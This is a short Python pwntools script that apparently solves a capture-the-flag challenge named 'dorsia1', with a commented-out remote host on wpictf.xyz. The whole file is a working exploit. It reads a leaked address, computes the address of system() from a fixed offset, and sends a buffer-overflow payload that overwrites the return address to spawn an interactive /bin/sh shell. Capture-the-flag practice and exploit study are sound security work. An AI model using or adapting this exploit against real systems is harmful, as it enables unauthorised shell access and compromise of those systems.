#!/usr/bin/env python3

from pwn import *


context.arch = 'amd64'
r = process('./code')
# r = remote('dorsia1.wpictf.xyz', 31337)

input('xdd')

system = int(r.recvline().strip(), 16) - 765772

payload = b'//bin/sh\0'.ljust(0x50, b'\0') + b'b'*8 + p64(system)
r.send(payload)

r.interactive()

